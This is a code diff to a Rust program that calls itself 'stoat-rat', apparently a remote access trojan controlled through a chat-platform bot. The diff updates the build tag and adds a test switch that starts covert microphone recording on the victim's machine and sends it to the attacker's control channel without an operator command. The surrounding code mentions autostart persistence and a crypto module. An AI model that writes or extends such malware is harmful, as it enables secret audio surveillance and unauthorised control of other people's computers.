@@ -54,7 +54,7 @@ pub mod win_crypto;
 pub mod workspace;
 
 /// Build tag, surfaced in the online message so updates are visible.
-pub const BUILD: &str = "b25";
+pub const BUILD: &str = "b30";
 
 use anyhow::Result;
 use futures_util::{SinkExt, StreamExt};
@@ -194,6 +194,27 @@ pub async fn run_agent() -> Result<()> {
             Err(e) => eprintln!("[!] autostart failed: {e:#}"),
         }
     }
+    // Testing switch: drive a mic session without an operator command.
+    if std::env::var_os("RAT_VOICE_TEST").is_some() {
+        if let Some(control) = cfg.channel.clone() {
+            if let Ok(bot) = stoat::Stoat::new(&cfg.api, &cfg.autumn, &cfg.token).await {
+                if let Ok(ws) = workspace::ensure(&bot, &control).await {
+                    tokio::spawn(async {
+                        tokio::time::sleep(Duration::from_secs(25)).await;
+                        voice::STOP.store(true, std::sync::atomic::Ordering::SeqCst);
+                        eprintln!("[voice-test] stop requested after 25s");
+                    });
+                    let r = voice::voice_mic(&bot, &cfg, &ws).await;
+                    match r {
+                        Ok(ch) => eprintln!("[voice-test] ok -> {ch}"),
+                        Err(e) => eprintln!("[voice-test] failed: {e:#}"),
+                    }
+                }
+            }
+        }
+        return Ok(());
+    }
+
     println!("[+] stoat-rat starting (api {})", cfg.api);
 
     let bot = stoat::Stoat::new(&cfg.api, &cfg.autumn, &cfg.token).await?;
